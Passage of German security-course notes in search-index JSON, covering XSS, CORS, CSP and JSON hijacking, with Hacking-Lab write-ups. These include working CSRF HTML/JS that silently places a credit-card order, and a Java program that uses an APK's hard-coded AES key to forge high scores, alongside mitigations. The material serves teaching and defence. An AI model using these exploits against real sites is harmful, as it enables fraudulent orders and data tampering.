            "text": "Cross-Site Scripting (XSS)\n\n\nStored XSS\n\n\n\n\nAngreifer kann auf Website Code platzieren, dass vom Victim bei Besuch ausgef\u00fchrt wird\n\n\nMit dem JS wird das Victim dazu gebracht, dem Angreifer die Session zu schicken\n\n\nSOP verhindert das Senden per JS aber\n\n\nEs wird aber z.B. ein Bild eingebunden mit dem Cookie im Parameter\n\n\nDas Cookie landet im Access-Log des Angreifers\n\n\n\n\n\n\nAngreifer braucht Session selber (Session-Hijacking)\n\n\n\n\nReflected XSS\n\n\n\n\nAngreifer schickt GET-Request mit JS in Query-Parameter\n\n\nServer sendet 404 mit Fehlermeldung, dass es die Seite nicht gibt, und reflektiert das JS zur\u00fcck\n\n\n\n\nWenn diese Anfrage vom Opfer ausgef\u00fchrt wird, kann so beliebigs JS zur Ausf\u00fchrung gebracht werden\n\n\n\n\n\n\nModerne Browser merken das JS in der URL und verhindern das Ausf\u00fchren beim Reply (XSS-Filter)\n\n\n\n\nServer kann XSS-Filter auch enforcen (bei neuen Browsern) mit Header \nX-XSS-Protection\n\n\n\n\nDOM-Based XSS\n\n\n\n\nXSS im lokalen DOM ohne Server-Request\n\n\nJS-code wird im Anchor nach dem \n#\n angeh\u00e4ngt, so wird sie nie dem Server \u00fcbermittelt\n\n\n\n\nXSS Shell\n\n\n\n\nAngreifer injected \nscript src=\"attacker-site/script.js\"/\n auf Webapp\n\n\nOpfer f\u00fchrt Attacker-JS aus und pollt regelm\u00e4ssig den Attacker-Server\n\n\nSo kann die Shell Befehle schicken, die vom Opfer abgeholt werden\n\n\n\n\nMitigation\n\n\n\n\nHTML-Characters escapen\n\n\n in \nlt;\n usw. umwandeln\n\n\nIn Praxis schwierig, das nicht g\u00fcltige Zeichen wie \n'\n escaped werden", 
            "title": "6 XSS"
        }, 
        {
            "location": "/InfSi3/6_XSS/#cross-site-scripting-xss", 
            "text": "", 
            "title": "Cross-Site Scripting (XSS)"
        }, 
        {
            "location": "/InfSi3/6_XSS/#stored-xss", 
            "text": "Angreifer kann auf Website Code platzieren, dass vom Victim bei Besuch ausgef\u00fchrt wird  Mit dem JS wird das Victim dazu gebracht, dem Angreifer die Session zu schicken  SOP verhindert das Senden per JS aber  Es wird aber z.B. ein Bild eingebunden mit dem Cookie im Parameter  Das Cookie landet im Access-Log des Angreifers    Angreifer braucht Session selber (Session-Hijacking)", 
            "title": "Stored XSS"
        }, 
        {
            "location": "/InfSi3/6_XSS/#reflected-xss", 
            "text": "Angreifer schickt GET-Request mit JS in Query-Parameter  Server sendet 404 mit Fehlermeldung, dass es die Seite nicht gibt, und reflektiert das JS zur\u00fcck   Wenn diese Anfrage vom Opfer ausgef\u00fchrt wird, kann so beliebigs JS zur Ausf\u00fchrung gebracht werden    Moderne Browser merken das JS in der URL und verhindern das Ausf\u00fchren beim Reply (XSS-Filter)   Server kann XSS-Filter auch enforcen (bei neuen Browsern) mit Header  X-XSS-Protection", 
            "title": "Reflected XSS"
        }, 
        {
            "location": "/InfSi3/6_XSS/#dom-based-xss", 
            "text": "XSS im lokalen DOM ohne Server-Request  JS-code wird im Anchor nach dem  #  angeh\u00e4ngt, so wird sie nie dem Server \u00fcbermittelt", 
            "title": "DOM-Based XSS"
        }, 
        {
            "location": "/InfSi3/6_XSS/#xss-shell", 
            "text": "Angreifer injected  script src=\"attacker-site/script.js\"/  auf Webapp  Opfer f\u00fchrt Attacker-JS aus und pollt regelm\u00e4ssig den Attacker-Server  So kann die Shell Befehle schicken, die vom Opfer abgeholt werden", 
            "title": "XSS Shell"
        }, 
        {
            "location": "/InfSi3/6_XSS/#mitigation", 
            "text": "HTML-Characters escapen   in  lt;  usw. umwandeln  In Praxis schwierig, das nicht g\u00fcltige Zeichen wie  '  escaped werden", 
            "title": "Mitigation"
        }, 
        {
            "location": "/InfSi3/7_CORS/", 
            "text": "CORS\n\n\n\n\nCross Origin Resource Sharing\n\n\n\n\n\n\nZiel: Cross-Site-Requests erlauben, um z.B. per AJAX von einem anderen Server Daten zu laden\n\n\nAlternative mit \nscript src=\"..\" /\n, ist aber gef\u00e4hrlich, weil es in der gleichen Security Domain wie unsere App ausgef\u00fchrt wird!\n\n\n\n\n\n\nWarning\n\n\nKein Schutz gegen XSS!\n\n\n\n\n\n\nDer Browser schickt mit dem AJAX-Request einen \nOrigin: mySite\n header mit der Origin der Seite\n\n\nDer Server (API) kann entscheiden, ob die Origin erlaubt ist\n\n\nDer Server der API, auf die zugegriffen werden m\u00f6chte, setzt den Header \nAccess-Control-Allow-Origin: mySite\n bei der Antwort\n\n\n\n\nPre-flight request\n\n\n\n\nProblem: Bei der Antwort des Server weiss der Client noch nicht, ob er Cross-Domain damit kommunizieren kann\n\n\nDer Client schickt vor dem ersten eigentlichen Request einen \nOPTIONS\n-Request an den Server\n\n\nDer Server antwortet mit den verf\u00fcgbaren HTTP-Methoden \nund\n dem \nAccess-Control-Allow-Origin\n-Header\n\n\nNun weiss der Browser, ob er mit dem Server kommunizieren kann\n\n\nNicht alle CORS-Requests brauchen einen Pre-flight-Request, es ist standardisiert welche (z.B. Multipart form und alle Methoden ausser GET, POST und HEAD)\n\n\nWird vom Browser automatisch gemacht\n\n\n\n\nAngriffsvektor\n\n\n\n\nWenn der Angreifer den Browser kontrolliert, kann er den \norigin\n-Header manipulieren. Der Server k\u00f6nnte das aber irgendwann merken\n\n\nIm grossen Stil ist der Angriff nicht wirkungsvoll", 
            "title": "7 CORS"
        }, 
        {
            "location": "/InfSi3/7_CORS/#cors", 
            "text": "Cross Origin Resource Sharing    Ziel: Cross-Site-Requests erlauben, um z.B. per AJAX von einem anderen Server Daten zu laden  Alternative mit  script src=\"..\" / , ist aber gef\u00e4hrlich, weil es in der gleichen Security Domain wie unsere App ausgef\u00fchrt wird!    Warning  Kein Schutz gegen XSS!    Der Browser schickt mit dem AJAX-Request einen  Origin: mySite  header mit der Origin der Seite  Der Server (API) kann entscheiden, ob die Origin erlaubt ist  Der Server der API, auf die zugegriffen werden m\u00f6chte, setzt den Header  Access-Control-Allow-Origin: mySite  bei der Antwort", 
            "title": "CORS"
        }, 
        {
            "location": "/InfSi3/7_CORS/#pre-flight-request", 
            "text": "Problem: Bei der Antwort des Server weiss der Client noch nicht, ob er Cross-Domain damit kommunizieren kann  Der Client schickt vor dem ersten eigentlichen Request einen  OPTIONS -Request an den Server  Der Server antwortet mit den verf\u00fcgbaren HTTP-Methoden  und  dem  Access-Control-Allow-Origin -Header  Nun weiss der Browser, ob er mit dem Server kommunizieren kann  Nicht alle CORS-Requests brauchen einen Pre-flight-Request, es ist standardisiert welche (z.B. Multipart form und alle Methoden ausser GET, POST und HEAD)  Wird vom Browser automatisch gemacht", 
            "title": "Pre-flight request"
        }, 
        {
            "location": "/InfSi3/7_CORS/#angriffsvektor", 
            "text": "Wenn der Angreifer den Browser kontrolliert, kann er den  origin -Header manipulieren. Der Server k\u00f6nnte das aber irgendwann merken  Im grossen Stil ist der Angriff nicht wirkungsvoll", 
            "title": "Angriffsvektor"
        }, 
        {
            "location": "/InfSi3/8_CSP/", 
            "text": "CSP - Content Security Policy\n\n\n\n\nServer gibt vor, wohin der Browser sich verbinden darf\n\n\nSchutz gegen XSS mit \nscript src=\"...\" /\n\n\n\n\nWird geschickt per HTTP-Header \nX-Content-Security-Policy\n\n\n\n\n\n\nBeispiel: \nX-Content-Security-Policy script-src self ajax.google.com\n\n\n\n\nErlaubt nur Skripte von der Domain selbst und ajax.google.com\n\n\n\n\n\n\nGibt f\u00fcr Objekte wie css, bilder, etc. eigene policies\n\n\nXHRs werden \u00fcber \nconnect-src\n gesteuert!\n\n\n\n\n\n\ndefault-src: 'none'\n als ersten Wert fungiert als \"Deny all\", nachher k\u00f6nnen Ausnahmen definiert werden\n\n\nHXR-requests gehen \u00fcber \nconnect-src\n\n\nF\u00fcr Debugging kann mit \nreport-uri\n und dem Header \nContent-Security-Policy-Report-Only\n eine uri angegeben werden\n\n\nDer Browser enforced die Policy nicht, aber schickt violations an die angegebene uri\n\n\nAngreifer kann das ausnutzen, wenn er CSP ver\u00e4ndern kann - die Violations zu sich schicken lassen und so URLs herausfinden", 
            "title": "8 CSP"
        }, 
        {
            "location": "/InfSi3/8_CSP/#csp-content-security-policy", 
            "text": "Server gibt vor, wohin der Browser sich verbinden darf  Schutz gegen XSS mit  script src=\"...\" /   Wird geschickt per HTTP-Header  X-Content-Security-Policy    Beispiel:  X-Content-Security-Policy script-src self ajax.google.com   Erlaubt nur Skripte von der Domain selbst und ajax.google.com    Gibt f\u00fcr Objekte wie css, bilder, etc. eigene policies  XHRs werden \u00fcber  connect-src  gesteuert!    default-src: 'none'  als ersten Wert fungiert als \"Deny all\", nachher k\u00f6nnen Ausnahmen definiert werden  HXR-requests gehen \u00fcber  connect-src  F\u00fcr Debugging kann mit  report-uri  und dem Header  Content-Security-Policy-Report-Only  eine uri angegeben werden  Der Browser enforced die Policy nicht, aber schickt violations an die angegebene uri  Angreifer kann das ausnutzen, wenn er CSP ver\u00e4ndern kann - die Violations zu sich schicken lassen und so URLs herausfinden", 
            "title": "CSP - Content Security Policy"
        }, 
        {
            "location": "/InfSi3/9_JSON_Hijacking/", 
            "text": "JSON Hijacking\n\n\n\n\nBekannt geworden durch Google\n\n\nProfildaten wurden \u00fcber AJAX nachgeladen (per JSON und ins DOM eingef\u00fcgt)\n\n\n\n\n\n\n\n\nSzenario\n\n\n\n\nOpfer ist authentisiert mit Google\n\n\nOpfer greift auf Website des Hackers zu\n\n\nDarauf ist ein Script von Google eingebunden\n\n\nscript src=\"google.com/profile\" /\n z.B.\n\n\n\n\n\n\nDadurch schickt Opfer-Browser XHR-Request an Google (mit Access Token)\n\n\nGoogle gibt Daten als JSON zur\u00fcck\n\n\nIm JSON ist ein Array-Konstruktor hinterlegt\n\n\nHacker hat diese Funktion \u00fcberschrieben, um das JSON zu ihm zu schicken\n\n\n\n\nVoraussetzungen\n\n\n\n\nOpfer muss authentisiert sein\n\n\nJSONP oder allgemein Array-Konstruktor im JSON\n\n\nKeine vertraulichen Inhalte \u00fcber JSONP \u00fcbertragen!\n\n\n\n\n\n\n\n\nRemediation\n\n\n\n\nCORS einsetzen, um Zugriff einzuschr\u00e4nken\n\n\nGoogle hat zu Beginn des JSON eine Endlosschleife eingebaut, quick / dirty!", 
            "title": "9 JSON Hijacking"
        }, 
        {
            "location": "/InfSi3/9_JSON_Hijacking/#json-hijacking", 
            "text": "Bekannt geworden durch Google  Profildaten wurden \u00fcber AJAX nachgeladen (per JSON und ins DOM eingef\u00fcgt)", 
            "title": "JSON Hijacking"
        }, 
        {
            "location": "/InfSi3/9_JSON_Hijacking/#szenario", 
            "text": "Opfer ist authentisiert mit Google  Opfer greift auf Website des Hackers zu  Darauf ist ein Script von Google eingebunden  script src=\"google.com/profile\" /  z.B.    Dadurch schickt Opfer-Browser XHR-Request an Google (mit Access Token)  Google gibt Daten als JSON zur\u00fcck  Im JSON ist ein Array-Konstruktor hinterlegt  Hacker hat diese Funktion \u00fcberschrieben, um das JSON zu ihm zu schicken", 
            "title": "Szenario"
        }, 
        {
            "location": "/InfSi3/9_JSON_Hijacking/#voraussetzungen", 
            "text": "Opfer muss authentisiert sein  JSONP oder allgemein Array-Konstruktor im JSON  Keine vertraulichen Inhalte \u00fcber JSONP \u00fcbertragen!", 
            "title": "Voraussetzungen"
        }, 
        {
            "location": "/InfSi3/9_JSON_Hijacking/#remediation", 
            "text": "CORS einsetzen, um Zugriff einzuschr\u00e4nken  Google hat zu Beginn des JSON eine Endlosschleife eingebaut, quick / dirty!", 
            "title": "Remediation"
        }, 
        {
            "location": "/InfSi3/hacking-lab/2651_CSRF/", 
            "text": "2651 Cross Site Request Forgery\n\n\nAnalyse\n\n\n\n\nRequests mit eingeloggtem User per ZAP Proxy abfangen\n\n\nDas Hinzuf\u00fcgen zum Warenkorb geschieht mit GET und Query-Parameter\n\n\n\n\nGET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=10\nSubmit=Order\n\n\n\n\n\n\n\nBeim Absenden der Bestellung wird ein GET auf \n\n\n\n\n http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n\n\n\n\n\nausgef\u00fchrt\n\n\nExploit\n\n\nAuf der Landing Page erstellen wir eine HTML-Seite, damit der Browser per \nimg\n-Tag die beiden GET-Requests ausf\u00fchrt\n\n\nhtml\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\n\n\nDies funktioniert aber nicht richtig, da die beiden Bilder parallel geladen werden. Zuerst muss der erste Request abgeschlossen sein, bis der zweite beginnen kann\n\n\n\n\nhtml\n\n\nhead\n\n\nscript\n \ntype\n=\ntext/javascript\n\n    \nvar\n \nloadSecond\n \n=\n \nfunction\n()\n \n{\n\n        \ndocument\n.\nlocation\n=\norder.html\n;\n\n    \n}\n\n    \nvar\n \nimg\n \n=\n \ndocument\n.\nimages\n[\n0\n];\n\n    \nimg\n.\naddEventListener\n(\nload\n,\n \nloadSecond\n,\n \nfalse\n);\n\n\n/\nscript\n\n\n/\nhead\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody", 
            "title": "2651 CSRF"
        }, 
        {
            "location": "/InfSi3/hacking-lab/2651_CSRF/#2651-cross-site-request-forgery", 
            "text": "", 
            "title": "2651 Cross Site Request Forgery"
        }, 
        {
            "location": "/InfSi3/hacking-lab/2651_CSRF/#analyse", 
            "text": "Requests mit eingeloggtem User per ZAP Proxy abfangen  Das Hinzuf\u00fcgen zum Warenkorb geschieht mit GET und Query-Parameter   GET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=10 Submit=Order   Beim Absenden der Bestellung wird ein GET auf     http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder  ausgef\u00fchrt", 
            "title": "Analyse"
        }, 
        {
            "location": "/InfSi3/hacking-lab/2651_CSRF/#exploit", 
            "text": "Auf der Landing Page erstellen wir eine HTML-Seite, damit der Browser per  img -Tag die beiden GET-Requests ausf\u00fchrt  html  body  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=20 Submit=Order   height = 1   width = 1 /  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder   height = 1   width = 1 /  / body  / html    Dies funktioniert aber nicht richtig, da die beiden Bilder parallel geladen werden. Zuerst muss der erste Request abgeschlossen sein, bis der zweite beginnen kann   html  head  script   type = text/javascript \n     var   loadSecond   =   function ()   { \n         document . location = order.html ; \n     } \n     var   img   =   document . images [ 0 ]; \n     img . addEventListener ( load ,   loadSecond ,   false );  / script  / head  body  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct productId=2 quantity=20 Submit=Order   height = 1   width = 1 /  img   src = http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder   height = 1   width = 1 /  / body", 
            "title": "Exploit"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/", 
            "text": "4216 Folklore App Highscore Manipulation RE\n\n\nAnalyse\n\n\n\n\nAuf \nhttps://www.apkdecompilers.com\n das APK hochladen und die Source-Files herunterladen\n\n\n\n\nAlle Files durchsuchen nach \"encrypt\": \ngrep -r \"encrypt\"\n\n\n\n\n\n\nDer verschl\u00fcsselte Request wird im \nbackend/FolkloreService\n gesendet:\n\n\n\n\n\n\nStringBuilder\n \nlocalStringBuilder1\n \n=\n \nnew\n \nStringBuilder\n();\n\n    \nString\n \nstr\n \n=\n \nparamArrayOfCowGameScore\n[\n0\n].\ngetNickname\n()\n \n+\n \n    \n::\n \n+\n \nparamArrayOfCowGameScore\n[\n0\n].\ngetScore\n()\n \n+\n \n    \n::\n \n+\n \n(\nint\n)(\nSystem\n.\ncurrentTimeMillis\n()\n \n/\n \n1000L\n);\n\n\n    \nbyte\n[]\n \narrayOfByte\n \n=\n \nOpenSSL\n.\nencrypt\n(\nAES-256-CBC\n,\n \n    \nFbXVVzMwXKdHaFXz8sJRAwkprbCxfwQn74zHZX27jSjEwfvB\n.\ntoCharArray\n(),\n \n    \nstr\n.\ngetBytes\n(\nCharset\n.\nforName\n(\nASCII\n)),\n \nfalse\n);\n\n\n    \nHttpGet\n \nlocalHttpGet\n \n=\n \nnew\n \nHttpGet\n(\nUri\n.\nparse\n(\nFolkloreService\n.\nthis\n.\nmobileSiteURI\n.\ntoString\n())\n\n    \n.\nbuildUpon\n().\nappendEncodedPath\n(\nscore.php\n)\n\n    \n.\nappendQueryParameter\n(\nmessage\n,\n \nBase64\n.\nencodeToString\n(\narrayOfByte\n,\n \n8\n)).\nbuild\n().\ntoString\n());\n\n\n    \nStringBuilder\n \nlocalStringBuilder2\n \n=\n \nnew\n \nStringBuilder\n();\n\n    \nLog\n.\nd\n(\nFolkloreService\n,\n \nPosting \n \n+\n \nlocalHttpGet\n.\ngetURI\n().\ntoString\n());\n\n    \nFolkloreService\n.\nthis\n.\nfac\n.\nmakeHttpClient\n().\nexecute\n(\nlocalHttpGet\n);\n\n    \nreturn\n \nBoolean\n.\nvalueOf\n(\ntrue\n);\n\n\n\n\n\n\n\n\nEs ist aber nicht gut ersichtlich, was die \nmobileSiteURI\n ist, an die der Request geschickt wird. Da es aber nicht TLS-verschl\u00fcsselt ist, finden wir das schnell mit Wireshark heraus:\n\n\n\n\n\n\n\n\nDer Request ist also in der Form \nGET http://mobile.hacking-lab.com/score.php?message=\naes-256-message\n\n\nWie im Code zu sehen ist, ist die Message im Format \nnickname::score::timestamp\n\n\nDiese Message wird ASCII-Codiert AES-256 verschl\u00fcsselt und als Base64 als Query-Parameter \u00fcbergeben\n\n\n\n\nExploit\n\n\n\n\nF\u00fcr das OpenSSL wird ein altes Apache Commons verwendet\n\n\nIm Maven Repository ist noch ein altes Apache Commons SSL von driter Quelle vorhanden: \nhttps://search.maven.org/#artifactdetails%7Cca.juliusdavies%7Cnot-yet-commons-ssl%7C0.3.11%7Cjar\n\n\nF\u00fcr den HTTP-Client benutzen wir Apache Commons HttpClient: \nhttps://search.maven.org/#artifactdetails%7Ccommons-httpclient%7Ccommons-httpclient%7C20020423%7Cjar\n\n\n\n\n\n\nDaraus k\u00f6nnen wir ein Gradle-File erstellen, um das Projekt zu builden:\n\n\n\n\napply\n \nplugin:\n \njava\n\n\napply\n \nplugin:\n \neclipse\n\n\nrepositories\n \n{\n\n    \nmavenCentral\n()\n\n\n}\n\n\nsourceCompatibility\n \n=\n \n1.8\n\n\ntargetCompatibility\n \n=\n \n1.8\n\n\n\ndependencies\n \n{\n\n    \ncompile\n \ncommons-httpclient:commons-httpclient:20020423\n\n    \ncompile\n \nca.juliusdavies:not-yet-commons-ssl:0.3.11\n\n\n}\n\n\n\napply\n \nplugin:\n \napplication\n\n\n\nmainClassName\n \n=\n \nFolkloreServiceHack\n\n\n\n\n\n\n\n\nDas Programm kann mit \ngradle eclipse\n vorbereitet und anschliessend in Eclipse importiert werden\n\n\nF\u00fcr das Programm \u00fcbernehmen wir den Original-Code und \u00e4ndern lediglich die Aufrufe zum \nHttpClient\n, der Aufruf zu \nOpenSSL\n kann gleich bleiben\n\n\n\n\nimport\n \njava.net.URL\n;\n\n\nimport\n \njava.nio.charset.Charset\n;\n\n\nimport\n \njava.util.Base64\n;\n\n\n\nimport\n \norg.apache.commons.httpclient.HttpClient\n;\n\n\nimport\n \norg.apache.commons.httpclient.methods.GetMethod\n;\n\n\nimport\n \norg.apache.commons.ssl.OpenSSL\n;\n\n\n\npublic\n \nclass\n \nFolkloreServiceHack\n \n{\n\n\n    \npublic\n \nstatic\n \nvoid\n \nmain\n(\nString\n[]\n \nargs\n)\n \nthrows\n \nException\n \n{\n\n\n        \nString\n \nnickname\n \n=\n \nhax00r\n;\n\n        \nString\n \nscore\n \n=\n \n99999999999\n;\n\n        \nString\n \nmobileSiteURI\n \n=\n \nhttp://mobile.hacking-lab.com\n;\n\n\n        \nchar\n[]\n \npassphrase\n \n=\n \nFbXVVzMwXKdHaFXz8sJRAwkprbCxfwQn74zHZX27jSjEwfvB\n\n                \n.\ntoCharArray\n();\n\n\n        \nString\n \nmessage\n \n=\n \nnickname\n \n+\n \n::\n \n+\n \nscore\n \n+\n \n::\n\n                \n+\n \n(\nint\n)\n \n(\nSystem\n.\ncurrentTimeMillis\n()\n \n/\n \n1000L\n);\n\n        \nbyte\n[]\n \narrayOfByte\n \n=\n \nOpenSSL\n.\nencrypt\n(\nAES-256-CBC\n,\n\n                \npassphrase\n,\n \nmessage\n.\ngetBytes\n(\nCharset\n.\nforName\n(\nASCII\n)),\n \nfalse\n);\n\n        \nString\n \npath\n \n=\n \n/score.php?message=\n\n                \n+\n \nBase64\n.\ngetEncoder\n().\nencodeToString\n(\narrayOfByte\n);\n\n        \nGetMethod\n \nlocalHttpGet\n \n=\n \nnew\n \nGetMethod\n(\npath\n);\n\n        \nSystem\n.\nout\n.\nprintln\n(\npath\n);\n\n        \nHttpClient\n \nhttpClient\n \n=\n \nnew\n \nHttpClient\n();\n\n        \nhttpClient\n.\nstartSession\n(\nnew\n \nURL\n(\nmobileSiteURI\n));\n\n        \nhttpClient\n.\nexecuteMethod\n(\nlocalHttpGet\n);\n\n        \nSystem\n.\nout\n.\nprintln\n(\nlocalHttpGet\n.\ngetResponseBodyAsString\n());\n\n\n        \nhttpClient\n.\nendSession\n();\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nNach der Ausf\u00fchrung erscheinen wir als \nhax00r\n auf dem Scoreboard:\n\n\n\n\n\n\nAuswertung\n\n\nSicherheits-Probleme\n\n\n\n\nDer Traffic ist nicht verschl\u00fcsselt, was ein Abh\u00f6ren sehr einfach macht\n\n\nDas Posten des Highscores braucht keinerlei Authentifizierung\n\n\nDer Schl\u00fcssel f\u00fcr die AES256-Verschl\u00fcsselung ist hard-coded in der App\n\n\nIrgendwo muss der Key abgelegt Client-seitig abgelegt werden, es ist also unm\u00f6glich, ihn komplett geheim zu halten\n\n\n\n\n\n\nEs wird nicht gepr\u00fcft, ob ein Highscore \u00fcberhaupt realistisch ist, er kann beliebig gross werden\n\n\n\n\nMitigation\n\n\nSolche Highscore-Games, wo ein Client ein Highscore an den Server schickt, sind von Natur aus sehr schwer abzusichern, eine 100%ige-Sicherheit ist sogar unnm\u00f6glich, weil der Angreifer komplette Kontrolle \u00fcber den Client hat. Auch wenn lokale Encryption-Keys verwendet werden, k\u00f6nnen diese immer aus dem Binary oder dem de-compilierten Sourcecode gelsen werden. Der Server kann nie mit absoluter Sicherheit wissen, ob ein Highscore wirklich g\u00fcltig ist. Eine Authentisierung mit Token n\u00fctzt auch nicht viel, da der Angreifer dies einfach auslesen und selbst benutzen kann.\n\n\nAllerdings kann man einige H\u00fcrden einbauen, die einen Angriff komplizierter und teurer machen. Hier werden nur ein paar aufgez\u00e4hlt, geordnet nach den Offensichtlichsten:\n\n\n\n\nTLS verwenden\n\n\nAuthentifizierung mit dem Highscore-Server, z.B. \u00fcber ein Cookie oder Session-Token, das beim Highscore-Request mitgeschickt wird\n\n\nUn\u00fcblich hohe Highscores ignorieren\n\n\nRequests limitieren, die von einem User gemacht werden\n\n\nZu Beginn ein vom Server verschl\u00fcsseltes Token senden (mit z.B. der User ID), dass dann beim Highscore-Request vom Client mitgeschickt wird\n\n\nMit dem Token pr\u00fcfen, wie lang ein Spiel dauert, und Highscore von zu kurzen oder zu langen Spielen verwerfen\n\n\nW\u00e4hrend dem Spielen kontinuierlich den Zwischen-Score zum Server schicken, der die Punktzahl selbst hochz\u00e4hlen kann\n\n\n\n\nEine gute Zusammenfassung zum Thema ist auch in dieser Stackoverflow-Antwort zu finden:\n\n\nhttp://stackoverflow.com/a/74841", 
            "title": "4216 Folklore App"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#4216-folklore-app-highscore-manipulation-re", 
            "text": "", 
            "title": "4216 Folklore App Highscore Manipulation RE"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#analyse", 
            "text": "Auf  https://www.apkdecompilers.com  das APK hochladen und die Source-Files herunterladen   Alle Files durchsuchen nach \"encrypt\":  grep -r \"encrypt\"    Der verschl\u00fcsselte Request wird im  backend/FolkloreService  gesendet:    StringBuilder   localStringBuilder1   =   new   StringBuilder (); \n     String   str   =   paramArrayOfCowGameScore [ 0 ]. getNickname ()   +  \n     ::   +   paramArrayOfCowGameScore [ 0 ]. getScore ()   +  \n     ::   +   ( int )( System . currentTimeMillis ()   /   1000L ); \n\n     byte []   arrayOfByte   =   OpenSSL . encrypt ( AES-256-CBC ,  \n     FbXVVzMwXKdHaFXz8sJRAwkprbCxfwQn74zHZX27jSjEwfvB . toCharArray (),  \n     str . getBytes ( Charset . forName ( ASCII )),   false ); \n\n     HttpGet   localHttpGet   =   new   HttpGet ( Uri . parse ( FolkloreService . this . mobileSiteURI . toString ()) \n     . buildUpon (). appendEncodedPath ( score.php ) \n     . appendQueryParameter ( message ,   Base64 . encodeToString ( arrayOfByte ,   8 )). build (). toString ()); \n\n     StringBuilder   localStringBuilder2   =   new   StringBuilder (); \n     Log . d ( FolkloreService ,   Posting    +   localHttpGet . getURI (). toString ()); \n     FolkloreService . this . fac . makeHttpClient (). execute ( localHttpGet ); \n     return   Boolean . valueOf ( true );    Es ist aber nicht gut ersichtlich, was die  mobileSiteURI  ist, an die der Request geschickt wird. Da es aber nicht TLS-verschl\u00fcsselt ist, finden wir das schnell mit Wireshark heraus:     Der Request ist also in der Form  GET http://mobile.hacking-lab.com/score.php?message= aes-256-message  Wie im Code zu sehen ist, ist die Message im Format  nickname::score::timestamp  Diese Message wird ASCII-Codiert AES-256 verschl\u00fcsselt und als Base64 als Query-Parameter \u00fcbergeben", 
            "title": "Analyse"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#exploit", 
            "text": "F\u00fcr das OpenSSL wird ein altes Apache Commons verwendet  Im Maven Repository ist noch ein altes Apache Commons SSL von driter Quelle vorhanden:  https://search.maven.org/#artifactdetails%7Cca.juliusdavies%7Cnot-yet-commons-ssl%7C0.3.11%7Cjar  F\u00fcr den HTTP-Client benutzen wir Apache Commons HttpClient:  https://search.maven.org/#artifactdetails%7Ccommons-httpclient%7Ccommons-httpclient%7C20020423%7Cjar    Daraus k\u00f6nnen wir ein Gradle-File erstellen, um das Projekt zu builden:   apply   plugin:   java  apply   plugin:   eclipse  repositories   { \n     mavenCentral ()  }  sourceCompatibility   =   1.8  targetCompatibility   =   1.8  dependencies   { \n     compile   commons-httpclient:commons-httpclient:20020423 \n     compile   ca.juliusdavies:not-yet-commons-ssl:0.3.11  }  apply   plugin:   application  mainClassName   =   FolkloreServiceHack    Das Programm kann mit  gradle eclipse  vorbereitet und anschliessend in Eclipse importiert werden  F\u00fcr das Programm \u00fcbernehmen wir den Original-Code und \u00e4ndern lediglich die Aufrufe zum  HttpClient , der Aufruf zu  OpenSSL  kann gleich bleiben   import   java.net.URL ;  import   java.nio.charset.Charset ;  import   java.util.Base64 ;  import   org.apache.commons.httpclient.HttpClient ;  import   org.apache.commons.httpclient.methods.GetMethod ;  import   org.apache.commons.ssl.OpenSSL ;  public   class   FolkloreServiceHack   { \n\n     public   static   void   main ( String []   args )   throws   Exception   { \n\n         String   nickname   =   hax00r ; \n         String   score   =   99999999999 ; \n         String   mobileSiteURI   =   http://mobile.hacking-lab.com ; \n\n         char []   passphrase   =   FbXVVzMwXKdHaFXz8sJRAwkprbCxfwQn74zHZX27jSjEwfvB \n                 . toCharArray (); \n\n         String   message   =   nickname   +   ::   +   score   +   :: \n                 +   ( int )   ( System . currentTimeMillis ()   /   1000L ); \n         byte []   arrayOfByte   =   OpenSSL . encrypt ( AES-256-CBC , \n                 passphrase ,   message . getBytes ( Charset . forName ( ASCII )),   false ); \n         String   path   =   /score.php?message= \n                 +   Base64 . getEncoder (). encodeToString ( arrayOfByte ); \n         GetMethod   localHttpGet   =   new   GetMethod ( path ); \n         System . out . println ( path ); \n         HttpClient   httpClient   =   new   HttpClient (); \n         httpClient . startSession ( new   URL ( mobileSiteURI )); \n         httpClient . executeMethod ( localHttpGet ); \n         System . out . println ( localHttpGet . getResponseBodyAsString ()); \n\n         httpClient . endSession (); \n     }  }    Nach der Ausf\u00fchrung erscheinen wir als  hax00r  auf dem Scoreboard:", 
            "title": "Exploit"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#auswertung", 
            "text": "", 
            "title": "Auswertung"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#sicherheits-probleme", 
